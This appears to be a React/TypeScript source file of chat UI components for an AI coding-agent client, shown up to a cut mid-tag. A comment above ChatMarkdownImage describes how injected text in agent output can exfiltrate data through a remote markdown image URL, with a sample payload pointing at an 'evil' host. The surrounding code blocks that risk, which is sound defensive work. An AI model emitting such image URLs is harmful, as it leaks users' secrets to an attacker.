import React, { useState } from "react";
import ReactMarkdown, { defaultUrlTransform } from "react-markdown";
import remarkGfm from "remark-gfm";
import {
  ArrowUp,
  BookOpen,
  Check,
  ChevronDown,
  CircleCheck,
  CircleSlash,
  CircleX,
  Terminal,
  AlertCircle,
  Image as ImageIcon,
  Info,
  Layers,
  Loader2,
  FileText,
  Eye,
  SquarePen,
  Search,
  Globe,
  Users,
  ListChecks,
  Wrench,
  Brain,
  MessageSquare,
} from "lucide-react";
import { cn } from "../../lib/cn";
import { handleExternalLinkClick } from "../../lib/externalLinks";
import {
  referenceHistoryDisclosure,
  type ReferenceAbandonedBranch,
  type ReferenceHistoryPage,
  type ReferenceImageRef,
  type ReferencePart,
  type ReferenceSkillActivity,
  type ReferenceTaskResult,
} from "./referenceTypes";

export type ActivityState = "thinking" | "running_tool" | "waiting_for_input" | "idle";

export interface ActivityIndicatorProps {
  state: ActivityState;
  label?: string;
  className?: string;
}

export const ActivityIndicator: React.FC<ActivityIndicatorProps> = ({
  state,
  label,
  className,
}) => {
  if (state === "idle") return null;

  const config = {
    thinking: { text: label || "Thinking…", textColor: "text-chat-foreground-secondary", spin: true },
    running_tool: { text: label || "Running a tool…", textColor: "text-chat-foreground-secondary", spin: true },
    // the agent needs the user: the warning ink, never the "all fine" green
    waiting_for_input: { text: label || "Waiting for you", textColor: "text-status-warning", spin: false },
  }[state];

  return (
    <div className={cn("inline-flex items-center gap-2 text-sm", config.textColor, className)}>
      {config.spin ? (
        <Loader2 aria-hidden="true" className="size-3.5 animate-spin motion-reduce:animate-none" />
      ) : (
        <AlertCircle aria-hidden="true" className="size-3.5" />
      )}
      <span className="whitespace-nowrap">{config.text}</span>
    </div>
  );
};

export interface ChatAttachment {
  id: string;
  name: string;
  type: string;
  url?: string;
  size?: number | string;
  file?: File;
}

export interface AttachmentListProps {
  attachments: ChatAttachment[];
  className?: string;
}

export const AttachmentList: React.FC<AttachmentListProps> = ({
  attachments,
  className,
}) => {
  if (!attachments || attachments.length === 0) return null;

  return (
    <div className={cn("flex flex-wrap gap-2 pt-1.5", className)}>
      {attachments.map((att) => {
        if ((att.type === "image" || att.type.startsWith("image/")) && att.url) {
          return (
            <div
              key={att.id}
              className="relative overflow-hidden rounded-lg border border-chat-border bg-chat-surface max-w-[12.5rem]"
            >
              <img
                src={att.url}
                alt={att.name}
                className="h-28 w-auto object-cover"
                loading="lazy"
              />
              <div className="absolute inset-x-0 bottom-0 bg-chat-screen/90 px-1.5 py-0.5 text-xs text-chat-foreground truncate">
                {att.name}
              </div>
            </div>
          );
        }

        return (
          <div
            key={att.id}
            className="flex items-center gap-2 rounded-lg border border-chat-border bg-chat-surface px-2.5 py-1.5 text-xs text-chat-foreground-secondary"
          >
            <FileText aria-hidden="true" className="size-3.5 text-chat-foreground-secondary shrink-0" />
            <span className="truncate max-w-[9rem] font-medium">{att.name}</span>
            {att.size !== undefined && (
              <span className="text-xs text-chat-foreground-secondary font-mono">
                {String(att.size)}
              </span>
            )}
          </div>
        );
      })}
    </div>
  );
};

export type ToolStatus = "running" | "success" | "error";

export interface ToolCallCardProps {
  kind?: "tool";
  toolName: string;
  summary?: string;
  command?: string;
  output?: string;
  status?: "running" | "success" | "error";
  durationMs?: number;
  className?: string;
  workKey?: string;
}

export function getToolIcon(toolName: string) {
  const lower = (toolName || "").toLowerCase();
  if (["bash", "cmd", "eval", "shell", "exec"].includes(lower)) return Terminal;
  if (["read", "view", "cat", "look_at"].includes(lower)) return Eye;
  if (["edit", "write", "apply_patch", "ast_grep_replace"].includes(lower)) return SquarePen;
  if (
    ["grep", "glob", "search", "find", "ast_grep_search"].includes(lower) ||
    lower.startsWith("lsp_")
  )
    return Search;
  if (lower.startsWith("web") || lower === "fetch" || lower === "browser") return Globe;
  if (lower === "task" || lower.startsWith("agent") || lower === "workpool") return Users;
  if (lower === "todo") return ListChecks;
  return Wrench;
}

export function getToolVerb(toolName: string): string {
  const lower = (toolName || "").toLowerCase();
  if (["read", "view", "cat", "look_at"].includes(lower)) return "Read";
  if (["edit", "write", "apply_patch", "ast_grep_replace"].includes(lower)) return "Edited";
  if (
    ["grep", "glob", "search", "find", "ast_grep_search"].includes(lower) ||
    lower.startsWith("lsp_")
  )
    return "Searched";
  if (lower.startsWith("web") || lower === "fetch" || lower === "browser") return "Fetched";
  if (lower === "todo") return "Updated todos";
  return `Ran ${toolName || "tool"}`;
}

export interface WorkRowProps {
  icon: React.ComponentType<{ className?: string; "aria-hidden"?: boolean | "true" | "false" }>;
  label: React.ReactNode;
  canExpand: boolean;
  expanded: boolean;
  onToggle: () => void;
  isError?: boolean;
  isRunning?: boolean;
  className?: string;
  containerTestId?: string;
  expandedContent?: React.ReactNode;
}

export const WorkRow: React.FC<WorkRowProps> = ({
  icon: Icon,
  label,
  canExpand,
  expanded,
  onToggle,
  isError = false,
  isRunning = false,
  className,
  containerTestId,
  expandedContent,
}) => {
  const rowContent = (
    <>
      <div className="size-6 shrink-0 flex items-center justify-center self-start mt-0.5">
        <Icon
          aria-hidden="true"
          className={cn("size-3.5", isError ? "text-chat-danger" : "text-chat-foreground-secondary")}
        />
      </div>
      <div
        className={cn(
          "min-w-0 flex-1 line-clamp-2 break-words text-sm leading-snug",
          isError ? "text-chat-danger" : isRunning ? "work-shimmer-text" : "text-chat-foreground-secondary"
        )}
      >
        {label}
      </div>
      {isError && <span className="sr-only">Failed</span>}
      {isRunning && <span className="sr-only">Running</span>}
    </>
  );

  return (
    <div data-testid={containerTestId} className={cn("w-full", className)}>
      {canExpand ? (
        <button
          type="button"
          aria-expanded={expanded}
          data-testid="work-row"
          onClick={onToggle}
          className={cn(
            "w-full min-h-11 flex items-center gap-1.5 px-1 py-1 text-left rounded hover:bg-chat-row-hover transition-colors group focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring",
            isError ? "text-chat-danger" : "text-chat-foreground-secondary"
          )}
        >
          {rowContent}
        </button>
      ) : (
        <div
          data-testid="work-row"
          className={cn(
            "w-full min-h-11 flex items-center gap-1.5 px-1 py-1 text-left rounded transition-colors group",
            isError ? "text-chat-danger" : "text-chat-foreground-secondary"
          )}
        >
          {rowContent}
        </div>
      )}

      {canExpand && expanded && expandedContent}
    </div>
  );
};

export const ToolCallCard: React.FC<ToolCallCardProps> = ({
  toolName,
  summary,
  command,
  output,
  status = "success",
  className,
  workKey: _workKey,
}) => {
  const [expanded, setExpanded] = useState(false);
  const canExpand = Boolean(command || output);
  const isError = status === "error";
  const isRunning = status === "running";

  const Icon = getToolIcon(toolName);
  const verb = getToolVerb(toolName);
  const firstLine = command ? command.trim().split("\n")[0] : "";

  const labelNode = summary ? (
    <span>{summary}</span>
  ) : (
    <>
      <span>{verb}</span>
      {firstLine && (
        <>
          {" "}
          <span className="font-mono">{firstLine}</span>
        </>
      )}
    </>
  );

  const expandedPanel = (
    <div className="ml-7 rounded-lg bg-chat-surface px-3 py-2 space-y-1.5">
      {command && (
        <pre
          data-testid="tool-call-input"
          tabIndex={0}
          className="font-mono text-[0.8125rem] leading-relaxed text-chat-foreground whitespace-pre-wrap break-words select-text"
        >
          {command}
        </pre>
      )}
      {output && (
        <pre
          data-testid="work-row-output"
          tabIndex={0}
          className="font-mono text-[0.8125rem] leading-relaxed text-chat-foreground whitespace-pre-wrap break-words select-text"
        >
          {output}
        </pre>
      )}
    </div>
  );

  return (
    <WorkRow
      icon={Icon}
      label={labelNode}
      canExpand={canExpand}
      expanded={expanded}
      onToggle={() => setExpanded((prev) => !prev)}
      isError={isError}
      isRunning={isRunning}
      className={className}
      expandedContent={expandedPanel}
    />
  );
};

export interface ThinkingBlockProps {
  kind: "thinking";
  text: string;
  source?: "prose";
  workKey?: string;
}

export type ChatWorkItem = ToolCallCardProps | ThinkingBlockProps;

export const ThinkingBlock: React.FC<{ text: string; source?: "prose" }> = ({
  text,
  source,
}) => {
  const [expanded, setExpanded] = useState(false);
  const trimmed = text ? text.trim() : "";
  const firstLine = trimmed ? trimmed.split("\n")[0] : "";
  const canExpand = trimmed.length > 0;
  const isProse = source === "prose";
  const Icon = isProse ? MessageSquare : Brain;

  const labelNode = isProse ? (
    <>
      <span className="sr-only">Message: </span>
      {firstLine && <span>{firstLine}</span>}
    </>
  ) : (
    <>
      <span className="font-medium">Thinking</span>
      {firstLine && (
        <>
          {" "}
          <span>{firstLine}</span>
        </>
      )}
    </>
  );

  const expandedPanel = (
    <div className="ml-7 rounded-lg bg-chat-surface px-3 py-2">
      <p
        tabIndex={0}
        className="font-sans text-sm text-chat-foreground-secondary whitespace-pre-wrap break-words select-text"
      >
        {text}
      </p>
    </div>
  );

  return (
    <WorkRow
      containerTestId="thinking-block"
      icon={Icon}
      label={labelNode}
      canExpand={canExpand}
      expanded={expanded}
      onToggle={() => setExpanded((prev) => !prev)}
      isError={false}
      isRunning={false}
      expandedContent={expandedPanel}
    />
  );
};

export interface ApprovalActionCardProps {
  title?: string;
  /** Drawn inside a card that already shows the title: no shell, no header of its own. */
  bare?: boolean;
  description: string;
  confirmLabel?: string;
  declineLabel?: string;
  allowCustomFeedback?: boolean;
  feedbackPlaceholder?: string;
  /** `event`: the button's click, so a caller can tell a tap from a key press */
  onAccept: (feedback?: string, event?: React.MouseEvent<HTMLButtonElement>) => void;
  onDecline: (feedback?: string, event?: React.MouseEvent<HTMLButtonElement>) => void;
  isSubmitting?: boolean;
  className?: string;
}

export const ApprovalActionCard: React.FC<ApprovalActionCardProps> = ({
  title = "Needs your approval",
  bare = false,
  description,
  confirmLabel = "Approve",
  declineLabel = "Decline",
  allowCustomFeedback = true,
  feedbackPlaceholder = "Add instructions or a reason…",
  onAccept,
  onDecline,
  isSubmitting = false,
  className,
}) => {
  const [feedback, setFeedback] = useState("");
  const [showFeedbackInput, setShowFeedbackInput] = useState(false);

  const handleConfirm = (event: React.MouseEvent<HTMLButtonElement>) => {
    onAccept(feedback.trim() ? feedback.trim() : undefined, event);
  };

  const handleDecline = (event: React.MouseEvent<HTMLButtonElement>) => {
    onDecline(feedback.trim() ? feedback.trim() : undefined, event);
  };

  const actions = (
    <>
      {allowCustomFeedback && showFeedbackInput && (
        <textarea
          value={feedback}
          onChange={(e) => setFeedback(e.target.value)}
          placeholder={feedbackPlaceholder}
          aria-label="Note for the agent"
          rows={2}
          disabled={isSubmitting}
          className="w-full rounded-lg border border-chat-border bg-chat-screen px-3 py-2 text-base text-chat-foreground placeholder:text-chat-foreground-tertiary transition-colors resize-none focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring"
        />
      )}

      {/* stacked, full width and 12px apart: a slip off one never lands on the other; the safe
          choice (decline) carries the primary emphasis */}
      <div className="flex flex-col gap-3">
        <button
          type="button"
          data-testid="approval-accept"
          onClick={handleConfirm}
          disabled={isSubmitting}
          aria-busy={isSubmitting || undefined}
          className="flex min-h-11 w-full items-center justify-center gap-2 rounded-lg border border-chat-border bg-chat-surface-raised px-4 py-2 text-left text-sm font-medium text-chat-foreground transition-colors hover:bg-chat-surface-hover disabled:opacity-50 focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring"
        >
          {isSubmitting ? (
            <Loader2 aria-hidden="true" className="size-4 shrink-0 animate-spin motion-reduce:animate-none" />
          ) : (
            <Check aria-hidden="true" className="size-4 shrink-0" />
          )}
          <span className="min-w-0 break-words">{confirmLabel}</span>
        </button>
        <button
          type="button"
          data-testid="approval-decline"
          onClick={handleDecline}
          disabled={isSubmitting}
          className="flex min-h-11 w-full items-center justify-center rounded-lg bg-chat-primary px-4 py-2 text-sm font-medium text-chat-primary-foreground transition-colors hover:bg-chat-primary/90 disabled:opacity-50 focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring"
        >
          <span className="min-w-0 break-words">{declineLabel}</span>
        </button>
        {allowCustomFeedback && !showFeedbackInput && (
          <button
            type="button"
            onClick={() => setShowFeedbackInput(true)}
            className="flex min-h-11 w-full items-center justify-center rounded-lg px-4 text-sm text-chat-foreground-secondary transition-colors hover:bg-chat-row-hover hover:text-chat-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring"
          >
            Add a note
          </button>
        )}
      </div>
    </>
  );

  if (bare) {
    return <div className={cn("space-y-3", className)}>{actions}</div>;
  }

  return (
    <div
      className={cn(
        "rounded-xl border border-chat-border bg-chat-surface p-3.5 my-2.5 space-y-3",
        className
      )}
    >
      <div className="space-y-1 min-w-0">
        <h4 className="flex items-start gap-2 text-base font-semibold text-chat-foreground">
          <AlertCircle aria-hidden="true" className="mt-1 size-4 shrink-0 text-status-warning" />
          <span className="min-w-0 break-words">{title}</span>
        </h4>
        <p className="text-[0.9375rem] text-chat-foreground leading-relaxed break-words">
          {description}
        </p>
      </div>
      {actions}
    </div>
  );
};

/* ------------------------------------------------------------------------- *
 * Herdr reference conversation presentation (plan task 5)
 *
 * Everything below renders the frozen rich shapes of `./referenceTypes.ts` that the
 * task-4 client produces. It is presentation only: it fetches nothing, owns no target,
 * and never invents an assistant turn for a pane whose turns are same-pane output.
 * ------------------------------------------------------------------------- */

/** The tool part of the reference part union, named for a card of its own. */
export type ReferenceToolPart = Extract<ReferencePart, { kind: "tool" }>;
/** The image part of the reference part union. */
export type ReferenceImageRefPart = Extract<ReferencePart, { kind: "image" }>;
/** The background-task part of the reference part union. */
export type ReferenceTaskResultsPart = Extract<ReferencePart, { kind: "taskResult" }>;

/**
 * Where a part's bytes live when the page does not carry them: the owning host serves
 * them, and this component never guesses a URL or a path of its own.
 */
export interface ReferencePartRenderContext {
  /** The owning host's URL for an opaque image ref; `null` renders a labelled chip. */
  resolveImageUrl?: (image: ReferenceImageRef) => string | null;
  /** Ask for a cut tool output's whole text (the page carries only its head). */
  onRequestWholeOutput?: (outputRef: string) => void;
  /** The output ref a fetch is in flight for, so its button reads as busy. */
  loadingOutputRef?: string | null;
}

/** A turn's own timestamp, as the chat prints it: ISO string, epoch millis, or as given. */
export function formatReferenceTimestamp(timestamp?: string | number | null): string | null {
  if (timestamp === null || timestamp === undefined || timestamp === "") return null;
  if (typeof timestamp === "number") {
    const date = new Date(timestamp);
    return Number.isNaN(date.getTime())
      ? null
      : date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
  }
  const numeric = Number(timestamp);
  const date = Number.isNaN(numeric) ? new Date(timestamp) : new Date(numeric);
  return Number.isNaN(date.getTime())
    ? timestamp
    : date.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
}

/**
 * The label for turns a `/tree` walked away from. One abandoned path of four turns and
 * four abandoned paths of one turn are different facts, so `branches` is said out loud.
 */
export function referenceAbandonedSummary(abandoned: ReferenceAbandonedBranch): string {
  const turns = abandoned.count === 1 ? "1 earlier turn" : `${abandoned.count} earlier turns`;
  return abandoned.branches > 1
    ? `${turns} on ${abandoned.branches} branches you navigated away from`
    : `${turns} on a branch you navigated away from`;
}

/** Shown when the transcript carries no summary of the branch that was walked away from. */
export const REFERENCE_ABANDONED_NOTE =
  "The agent kept them in the session file but answers from the branch you chose. Use /tree in the terminal to go back.";

/** What a runtime notice was: a background result by name, anything else by its first line. */
export function referenceNoticeLabel(notice: { text: string; source?: string | null }): string {
  const source = notice.source;
  if (source === undefined || source === null || source === "" || source === "async-result") {
    return "Background result delivered";
  }
  const first =
    notice.text.split("\n").find((line) => line.trim().length > 0)?.trim() ?? source;
  return first.length > 96 ? `${first.slice(0, 95)}…` : first;
}

/** Evidence of skill activity, said for what it is and not as a claim of completion. */
export function referenceSkillLabel(skill: ReferenceSkillActivity): string {
  if (skill.evidence === "invocation") {
    if (skill.status === "failed") return "Skill invocation failed";
    return skill.status === "requested" ? "Skill requested" : "Skill invoked";
  }
  if (skill.status === "failed") return "Skill read failed";
  return skill.status === "requested" ? "Reading skill requested" : "Skill instructions loaded";
}

/** What the recorded skill evidence does and does not prove. */
export function referenceSkillDetail(skill: ReferenceSkillActivity): string {
  return skill.evidence === "invocation"
    ? "Recorded by the agent's Skill tool. This does not mean the skill's work is complete."
    : "The transcript records loading this skill's instructions. This does not confirm every step was followed.";
}

const REFERENCE_TASK_STATUS_WORDS: Record<ReferenceTaskResult["status"], string> = {
  completed: "done",
  failed: "failed",
  cancelled: "cancelled",
};

export function referenceTaskStatusWord(status: ReferenceTaskResult["status"]): string {
  return REFERENCE_TASK_STATUS_WORDS[status];
}

/** A background task's elapsed time, as the reference prints it. */
export function formatReferenceDuration(ms: number): string {
  if (ms < 1000) return `${ms}ms`;
  const seconds = ms / 1000;
  if (seconds < 60) return `${Math.round(seconds * 10) / 10}s`;
  const minutes = Math.floor(seconds / 60);
  const rest = Math.round(seconds % 60);
  return rest === 0 ? `${minutes}m` : `${minutes}m ${rest}s`;
}

/** What a finished background task reported about itself, in one line. */
export function referenceTaskResultMeta(task: ReferenceTaskResult): string {
  const meta: string[] = [];
  if (task.agent) meta.push(task.agent);
  if (task.model) meta.push(task.model);
  if (task.durationMs !== undefined && task.durationMs !== null) {
    meta.push(formatReferenceDuration(task.durationMs));
  }
  if (task.turns !== undefined && task.turns !== null) {
    meta.push(`${task.turns} ${task.turns === 1 ? "turn" : "turns"}`);
  }
  if (task.toolCalls !== undefined && task.toolCalls !== null) {
    meta.push(`${task.toolCalls} ${task.toolCalls === 1 ? "tool call" : "tool calls"}`);
  }
  if (task.tokens !== undefined && task.tokens !== null && task.tokens !== 0) {
    meta.push(`${task.tokens} tokens`);
  }
  return meta.join(" · ");
}

/** Where an older page's control sits: idle, in flight, or failed and offering a retry. */
export type ReferenceOlderState = "idle" | "loading" | "failed";

export function referenceOlderControlLabel(state: ReferenceOlderState): string {
  if (state === "loading") return "Loading earlier messages…";
  if (state === "failed") return "Couldn't load earlier messages — retry";
  return "Earlier messages";
}

const REFERENCE_TASK_STATUS_ICONS: Record<
  ReferenceTaskResult["status"],
  React.ComponentType<{ className?: string; "aria-hidden"?: boolean | "true" | "false" }>
> = { completed: CircleCheck, failed: CircleX, cancelled: CircleSlash };

/** Only an image the page already holds (data:/blob:) is drawn inline; nothing is fetched for it. */
const INLINE_MARKDOWN_IMAGE = /^(?:data:image\/|blob:)/i;

/**
 * react-markdown strips data:/blob: sources by default; let an inline image through for
 * `src` only, and leave every other URL on the library's own safe list.
 */
export function chatMarkdownUrlTransform(url: string, key: string): string {
  if (key === "src" && INLINE_MARKDOWN_IMAGE.test(url)) return url;
  return defaultUrlTransform(url);
}

/**
 * Markdown image from agent output. A remote `src` would be fetched the moment it renders, which
 * lets injected text exfiltrate data through the URL (`![](https://evil/?d=secret)`). A remote
 * image is therefore drawn as a link showing its alt text and host that the reader taps to open.
 */
/** Set by markdown `a` overrides: an image inside a link must not render a second, nested anchor. */
export const MarkdownLinkContext = React.createContext(false);

export const ChatMarkdownImage: React.FC<{ src?: string; alt?: string }> = ({ src, alt }) => {
  const insideLink = React.useContext(MarkdownLinkContext);
  if (typeof src === "string" && INLINE_MARKDOWN_IMAGE.test(src)) {
    return <img src={src} alt={alt ?? ""} loading="lazy" className="my-1 max-w-full rounded-md" />;
  }
  let host = "";
  let href: string | undefined;
  if (typeof src === "string" && src.length > 0) {
    try {
      const url = new URL(src);
      if (url.protocol === "http:" || url.protocol === "https:") {
        host = url.host;
        href = src;
      }
    } catch {
      // not an absolute URL: shown as text only, never fetched or linked
    }
  }
  const label = (alt && alt.trim().length > 0 ? alt.trim() : "Image") + (host ? " (" + host + ")" : "");
  const className =
    "inline-flex items-center gap-1 rounded border border-chat-border bg-chat-surface px-1.5 py-0.5 text-xs text-chat-foreground-secondary";
  const icon = <ImageIcon aria-hidden="true" className="size-3 shrink-0" />;
  return href && !insideLink ? (
    <a
      data-testid="markdown-remote-image"
      href={href}
      target="_blank"
      onClick={handleExternalLinkClick}
      rel="noopener noreferrer"
      className={cn(className, "underline underline-offset-2 hover:text-chat-foreground")}
    >
      {icon}
      <span>{label}</span>
    </a>
  ) : (
    <span data-testid="markdown-remote-image" className={className}>
      {icon}
      <span>{label}</span>
    </span>
  );
};

/**
 * The prose vocabulary of a rich turn. It is hoisted because a map built inside the component
 * hands ReactMarkdown a NEW component identity on every render: React then unmounts and remounts
 * the rendered prose instead of updating it in place, which drops the reader's selection and
 * detaches any node a caller already holds (an assertion on the prose element fails on the next
 * re-render).
 */
const REFERENCE_PROSE_COMPONENTS = {
  p: ({ children }: any) => <p className="mb-2 last:mb-0">{children}</p>,
  a: ({ href, children }: any) => (
    <a
      href={href}
      target="_blank"
      onClick={handleExternalLinkClick}
      rel="noopener noreferrer"
      className="text-chat-link underline underline-offset-2 decoration-chat-link/60 hover:decoration-chat-link"
    >
      <MarkdownLinkContext.Provider value={true}>{children}</MarkdownLinkContext.Provider>
    </a>
  ),
  pre: ({ children }: any) => (
    <pre className="my-2 whitespace-pre-wrap break-words rounded-lg border border-chat-border bg-chat-screen p-3 font-mono text-[0.8125rem] leading-relaxed text-chat-foreground [&_code]:bg-transparent [&_code]:p-0 [&_code]:text-[1em] [&_code]:text-chat-foreground">
      {children}
    </pre>
  ),
  code: ({ children }: any) => (
    <code className="rounded bg-chat-surface-raised px-1 py-0.5 font-mono text-[0.875em] text-chat-code">
      {children}
    </code>
  ),
  img: ChatMarkdownImage,
  ul: ({ children }: any) => <ul className="list-disc pl-4 mb-2 space-y-1">{children}</ul>,
  ol: ({ children }: any) => <ol className="list-decimal pl-4 mb-2 space-y-1">{children}</ol>,
  blockquote: ({ children }: any) => (
    <blockquote className="my-2 rounded-lg bg-chat-surface px-3 py-2 text-chat-foreground-secondary">
      {children}
    </blockquote>
  ),
};

/** Markdown the page already carries, drawn the way the rest of the chat draws prose. */
const ReferenceProse: React.FC<{ text: string; className?: string }> = ({ text, className }) => (
  <div
    className={cn(
      "text-sm leading-relaxed text-chat-foreground-secondary break-words select-text",
      className,
    )}
  >
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      components={REFERENCE_PROSE_COMPONENTS}
      urlTransform={chatMarkdownUrlTransform}
    >
      {text}
    </ReactMarkdown>
  </div>
);

/**
 * The label a pane's turns carry when they are not a native transcript. It is a
 * disclosure, not an error: same-pane output is a legitimate answer, said out loud.
 */
export const ReferenceDisclosureBanner: React.FC<{ disclosure: string; className?: string }> = ({
  disclosure,
  className,
}) => (
  <div
    data-testid="reference-disclosure"
    role="note"
    className={cn(
      "flex items-start gap-2 rounded-lg border border-chat-border bg-chat-surface px-3 py-2 my-2 text-xs text-chat-foreground-secondary",
      className,
    )}
  >
    <Terminal aria-hidden="true" className="mt-0.5 size-3.5 shrink-0 text-chat-foreground-secondary" />
    <span className="min-w-0 break-words">{disclosure}</span>
  </div>
);

/** The disclosure for a whole page, or nothing at all when the page is native. */
export const ReferenceHistoryDisclosure: React.FC<{
  page: ReferenceHistoryPage;
  className?: string;
}> = ({ page, className }) => {
  const disclosure = referenceHistoryDisclosure(page);
  return disclosure === null ? null : (
    <ReferenceDisclosureBanner disclosure={disclosure} className={className} />
  );
};

/** The summary a compaction left; the conversation before it is what it sums up. */
export const ReferenceCompactionDisclosure: React.FC<{
  text: string;
  timestamp?: string | number | null;
  className?: string;
}> = ({ text, timestamp, className }) => {
  const time = formatReferenceTimestamp(timestamp);
  return (
    <details
      data-testid="reference-compaction"
      className={cn(
        "rounded-lg border border-chat-border bg-chat-surface px-3 my-1.5",
        className,
      )}
    >
      <summary className="flex min-h-11 items-center gap-1.5 cursor-pointer rounded text-xs font-medium text-chat-foreground-secondary select-none focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring">
        <CircleSlash aria-hidden="true" className="size-3.5 shrink-0" />
        <span>Conversation compacted</span>
        {time && (
          <span className="ml-auto shrink-0 font-mono text-xs text-chat-foreground-secondary">
            {time}
          </span>
        )}
      </summary>
      <div className="pb-2">
        <ReferenceProse text={text} />
      </div>
    </details>
  );
};

/**
 * Turns a `/tree` walked away from. No page of the live conversation can reach them, so
 * they are disclosed where the reader would look for them rather than dropped in silence.
 */
export const ReferenceAbandonedBranchDisclosure: React.FC<{
  abandoned: ReferenceAbandonedBranch;
  className?: string;
}> = ({ abandoned, className }) => (
  <details
    data-testid="reference-abandoned"
    className={cn(
      "w-full rounded-lg border border-chat-border bg-chat-surface px-3 my-1.5",
      className,
    )}
  >
    <summary className="flex min-h-11 items-center gap-1.5 cursor-pointer rounded text-xs font-medium text-chat-foreground-secondary select-none focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring">
      <Layers aria-hidden="true" className="size-3.5 shrink-0" />
      <span className="min-w-0">{referenceAbandonedSummary(abandoned)}</span>
    </summary>
    {abandoned.summary ? (
      <div className="pb-2">
        <ReferenceProse text={abandoned.summary} />
      </div>
    ) : (
      <p className="pb-2 text-xs text-chat-foreground-secondary">{REFERENCE_ABANDONED_NOTE}</p>
    )}
  </details>
);

/** The runtime spoke, not the user: a quiet divider, its text on request. */
export const ReferenceNoticeDisclosure: React.FC<{
  text: string;
  source?: string | null;
  timestamp?: string | number | null;
  className?: string;
}> = ({ text, source, timestamp, className }) => {
  const time = formatReferenceTimestamp(timestamp);
  return (
    <details
      data-testid="reference-notice"
      className={cn(
        "rounded-lg border border-chat-border bg-chat-surface px-3 my-1.5",
        className,
      )}
    >
      <summary className="flex min-h-11 items-center gap-1.5 cursor-pointer rounded text-xs font-medium text-chat-foreground-secondary select-none focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring">
        <Info aria-hidden="true" className="size-3.5 shrink-0" />
        <span className="min-w-0 truncate">{referenceNoticeLabel({ text, source })}</span>
        {time && (
          <span className="ml-auto shrink-0 font-mono text-xs text-chat-foreground-secondary">
            {time}
          </span>
        )}
      </summary>
      <pre className="pb-2 whitespace-pre-wrap break-words font-mono text-[0.8125rem] text-chat-foreground select-text">
        {text}
      </pre>
    </details>
  );
};

/** Skill evidence stays visible even when the surrounding work block is folded. */
export const ReferenceSkillEvidence: React.FC<{
  skill: ReferenceSkillActivity;
  className?: string;
}> = ({ skill, className }) => (
  <details
    data-testid="reference-skill"
    className={cn(
      "rounded-md border border-chat-border bg-chat-surface px-2 text-xs",
      className,
    )}
  >
    <summary className="flex min-h-11 items-center gap-1.5 cursor-pointer rounded text-chat-foreground-secondary select-none focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring">
      <BookOpen aria-hidden="true" className="size-3.5 shrink-0" />
      <span className="min-w-0 truncate">{skill.name}</span>
      <span
        className={cn(
          "ml-auto shrink-0 text-xs",
          skill.status === "failed" ? "text-chat-danger" : "text-chat-foreground-secondary",
        )}
      >
        {referenceSkillLabel(skill)}
      </span>
    </summary>
    <div className="pb-2 space-y-1 text-xs text-chat-foreground-secondary">
      <p>{referenceSkillDetail(skill)}</p>
      {skill.path && <code className="block truncate font-mono">{skill.path}</code>}
    </div>
  </details>
);

/** One background task that ended: what it was, how it went, and what it found. */
export const ReferenceTaskResultRow: React.FC<{
  task: ReferenceTaskResult;
  className?: string;
}> = ({ task, className }) => {
  const Icon = REFERENCE_TASK_STATUS_ICONS[task.status];
  const meta = referenceTaskResultMeta(task);
  return (
    <details
      data-testid="reference-task-result"
      className={cn("rounded-lg border border-chat-border bg-chat-surface", className)}
    >
      <summary className="flex min-h-11 items-center gap-2 px-2.5 py-1.5 cursor-pointer rounded-lg text-sm select-none focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring">
        <Icon
          aria-hidden="true"
          className={cn(
            "size-3.5 shrink-0",
            task.status === "failed"
              ? "text-chat-danger"
              : task.status === "cancelled"
                ? "text-chat-foreground-tertiary"
                : "text-status-success",
          )}
        />
        <span className="min-w-0 flex-1">
          <span className="flex items-baseline gap-2">
            <span className="min-w-0 flex-1 truncate text-chat-foreground">{task.title}</span>
            <span className="shrink-0 text-xs text-chat-foreground-secondary">
              {referenceTaskStatusWord(task.status)}
            </span>
          </span>
          {meta.length > 0 && (
            <span className="block truncate font-mono text-xs text-chat-foreground-secondary">{meta}</span>
          )}
        </span>
        <ChevronDown aria-hidden="true" className="size-3.5 shrink-0 text-chat-foreground-secondary" />
      </summary>
      <div className="border-t border-chat-border px-2.5 py-2">
        {task.result.trim().length > 0 ? (
          <ReferenceProse text={task.result} />
        ) : (
          <p className="text-xs text-chat-foreground-secondary">
            The task reported no result.
          </p>
        )}
        {task.resultCut === true && (
          <p className="mt-1 text-xs text-chat-foreground-secondary">
            This is the first part of a longer result.
          </p>
        )}
      </div>
    </details>
  );
};

/** OmO's background tasks reported back: a card of what ended, each result on request. */
export const ReferenceTaskResultsBlock: React.FC<{
  part: ReferenceTaskResultsPart;
  className?: string;
}> = ({ part, className }) => {
  if (part.tasks.length === 0) return null;
  const heading =
    part.tasks.length === 1
      ? "Background task ended"
      : `${part.tasks.length} background tasks ended`;
  return (
    <section
      data-testid="reference-task-results"
      aria-label={heading}
      className={cn("my-1.5 space-y-1.5", className)}
    >
      <p className="flex items-center gap-1.5 text-xs font-medium text-chat-foreground-secondary">
        <Layers aria-hidden="true" className="size-3.5" />
        <span>{heading}</span>
      </p>
      {part.tasks.map((task) => (
        <ReferenceTaskResultRow key={task.id} task={task} />
      ))}
    </section>
  );
};

/**
 * An image the page names but does not carry. Without a resolver for its owning host the
 * ref is shown as a labelled chip: a fabricated URL would be a lie about where it lives.
 */
export const ReferenceImagePart: React.FC<{
  part: ReferenceImageRefPart;
  context?: ReferencePartRenderContext;
  className?: string;
}> = ({ part, context, className }) => {
  const src = context?.resolveImageUrl?.(part) ?? null;
  if (src !== null && src !== "") {
    return (
      <a
        href={src}
        target="_blank"
        onClick={handleExternalLinkClick}
        rel="noopener noreferrer"
        title={part.ref}
        className={cn(
          "block overflow-hidden rounded-lg border border-chat-border bg-chat-surface max-w-[12.5rem]",
          className,
        )}
      >
        <img
          data-testid="reference-image"
          src={src}
          alt={part.mediaType}
          loading="lazy"
          className="h-28 w-auto object-cover"
